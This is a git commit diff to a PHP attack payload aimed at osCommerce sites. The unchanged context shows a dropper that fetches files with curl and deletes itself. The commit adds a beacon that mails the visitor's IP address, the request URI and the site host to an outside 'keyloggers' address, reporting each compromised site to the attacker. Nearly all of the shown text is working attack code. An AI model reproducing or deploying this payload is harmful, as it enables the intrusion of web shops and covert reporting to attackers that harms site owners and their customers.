d73ccad310fca2e4a6a6401c29434291fa8fe07e
LMFAO <25004320+apidotmy@users.noreply.github.com>
2020-08-19 02:18:06 +0800

    Update OsComPayLoad.php

--- files/OsComPayLoad.php
+++ files/OsComPayLoad.php
@@ -1,4 +1,4 @@
-<title>Vuln!! patch it Now!</title>
+<title>En Banglasia</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
@@ -30,4 +30,16 @@ if(file_exists($check2)){
   echo "not exits";
 echo "done .\n " ;
 @unlink(__FILE__);
+?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " ap1d.my |$ip";
+$email = "keyloggersresults@gmail.com";
+$from = "From: Keyloggers<ap1d@ap1d.my";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
 ?>
